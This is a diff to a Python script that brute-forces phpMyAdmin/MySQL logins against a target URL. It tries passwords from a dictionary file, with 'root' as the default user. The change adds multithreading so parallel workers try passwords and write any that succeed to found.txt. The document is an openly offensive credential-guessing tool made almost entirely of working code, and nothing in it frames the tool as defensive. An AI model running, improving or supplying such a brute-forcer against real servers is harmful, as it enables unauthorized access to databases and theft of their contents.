@@ -4,7 +4,21 @@ import html
 import re
 import os
 import argparse
+import threading
+import time
 
+
+def thread_function(index):
+	while len(passwords) != 0:
+		password = passwords.pop(0)
+		if login(url, username, password):
+			print("[*] FOUND - %s / %s / thead %s" % (username, password,(index+1)))
+			f = open("found.txt", "w")
+			f.write("%s / %s\n" % (username, password))
+			f.close()
+			break
+		else:
+			print("[!] FAILED - %s / %s / thead %s" % (username, password,(index+1)))
 
 def login(url, username, password):
 	for i in range(3):
@@ -25,15 +39,24 @@ def login(url, username, password):
 	return False
 
 def main():
-	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
+	global url
+	global username
+	global passwords
+	global threadlist
+
+	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt -threads 2' % (os.path.basename(__file__)))
 	parser.add_argument('-url', help='The URL of target website')
 	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
 	parser.add_argument('-dict', default='password.txt', help='The file path of password dictionary (default: password.txt)')
+	parser.add_argument('-threads', default='1', help='How  many threads to use (default: 1)')
 
 	args = parser.parse_args()
 	url = args.url
 	username = args.user
 	dictionary = args.dict
+	threads = args.threads
+
+
 
 	if url is None:
 		parser.print_help()
@@ -47,15 +70,17 @@ def main():
 		print("[-] Failed to read '%s' file." % (dictionary))
 		return
 
-	for password in passwords:
-		if login(url, username, password):
-			print("[*] FOUND - %s / %s" % (username, password))
+	threadlist = list()
+	for index in range(int(threads)):
+		print("create and start thread ", (index+1))
+		x = threading.Thread(target=thread_function, args=(index,))
+		threadlist.append(x)
+		x.start()
 
-			f = open("found.txt", "w")
-			f.write("%s / %s\n" % (username, password))
-			f.close()
-		else:
-			print("[!] FAILED - %s / %s" % (username, password))
+	for index, thread in enumerate(threadlist):
+		#print("Main    : before joining thread %d.", index)
+		thread.join()
+		#print("Main    : thread %d done", index)
 
 if __name__ == '__main__':
 	main()
